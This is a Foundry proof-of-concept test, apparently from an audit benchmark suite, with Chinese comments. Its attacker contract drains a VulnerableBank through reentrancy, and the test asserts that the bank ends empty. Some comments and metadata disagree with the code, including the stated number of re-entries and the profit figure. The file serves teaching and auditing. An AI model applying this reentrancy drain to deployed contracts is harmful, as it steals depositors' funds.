// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReentrancyPoC
 * @notice Foundry PoC test for VulnerableBank reentrancy exploit
 * @difficulty Beginner
 * @vuln_types Reentrancy
 * @expected_findings testReentrancyDrainsBank() should succeed; bank balance should be 0 after attack
 * @audit_command claude "audit contracts/test-cases/Reentrancy.sol"
 */

import "forge-std/Test.sol";
import "./Reentrancy.sol";

// ============================================================
// 攻击合约：AttackerReentrancy
// ============================================================
contract AttackerReentrancy {
    address public vulnerableBank;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = 20; // 足够大的重入次数，确保能完全清空银行

    constructor(address _vulnerableBank) {
        vulnerableBank = _vulnerableBank;
    }

    // 第一步：向 VulnerableBank 存入少量 ETH 作为启动资金
    function depositToBank() external payable {
        (bool success, ) = vulnerableBank.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "Deposit failed");
    }

    // 第二步：发起攻击
    function attack() external payable {
        attackCount = 0;
        (bool success, ) = vulnerableBank.call{value: msg.value}(
            abi.encodeWithSignature("withdraw()")
        );
        require(success, "Attack failed");
    }

    // 第三步：回调函数 — 重入核心
    receive() external payable {
        if (attackCount < MAX_ATTACKS) {
            attackCount++;
            // 重入 withdraw() — 不 revert，当银行余额不足时自然停止
            vulnerableBank.call(
                abi.encodeWithSignature("withdraw()")
            );
        }
    }

    // 第四步：将所有 ETH 转回攻击者
    function withdrawAll() external {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }
}

// ============================================================
// 测试合约
// ============================================================
contract ReentrancyPoCTest is Test {
    VulnerableBank public bank;
    AttackerReentrancy public attacker;
    address public attackerAddr = address(0xBEEF);

    function setUp() public {
        // 部署目标合约
        bank = new VulnerableBank();
        // 部署攻击合约
        attacker = new AttackerReentrancy(address(bank));

        // 给攻击者地址一些 ETH
        vm.deal(attackerAddr, 10 ether);

        // 模拟其他用户存款 —— 银行需要有资金才能被重入攻击 drain
        // 这模拟了真实场景：攻击者利用其他用户的存款进行重入
        bank.deposit{value: 10 ether}();
    }

    function test_reentrancyAttack() public {
        // ---- 攻击前状态 ----
        uint256 bankBalanceBefore = bank.getBalance();
        uint256 attackerBalanceBefore = attackerAddr.balance;
        console.log("=== Before Attack ===");
        console.log("Bank balance: ", bankBalanceBefore);
        console.log("Attacker balance: ", attackerBalanceBefore);

        // ---- Step 1: 攻击者存入 1 ETH ----
        vm.startPrank(attackerAddr);
        attacker.depositToBank{value: 1 ether}();
        console.log("\nAfter attacker deposits 1 ETH:");
        console.log("Bank balance: ", bank.getBalance());

        // ---- Step 2: 发起攻击（重入 withdraw 3 次）----
        attacker.attack{value: 0}();
        vm.stopPrank();

        // ---- 攻击后状态 ----
        uint256 bankBalanceAfter = bank.getBalance();
        uint256 attackerBalanceAfter = attackerAddr.balance;
        console.log("\n=== After Attack ===");
        console.log("Bank balance: ", bankBalanceAfter);
        console.log("Attacker balance: ", attackerBalanceAfter);

        // ---- Step 3: 攻击者取走所有 ETH ----
        vm.prank(attackerAddr);
        attacker.withdrawAll();

        uint256 finalAttackerBalance = attackerAddr.balance;
        console.log("\n=== Final State ===");
        console.log("Attacker final balance: ", finalAttackerBalance);

        // ---- 验证攻击结果 ----
        // 银行应该被清空（攻击者通过重入提取了所有资金）
        assertEq(bankBalanceAfter, 0, "Bank should be drained by reentrancy");
        // 攻击者获利 = 其他用户的 10 ETH 存款（扣除自身 1 ETH 存款后净赚 9 ETH）
        assertGt(finalAttackerBalance, attackerBalanceBefore, "Attacker should profit from reentrancy");
        console.log("\nReentrancy attack SUCCESS! Net profit: ", finalAttackerBalance - attackerBalanceBefore);
    }
}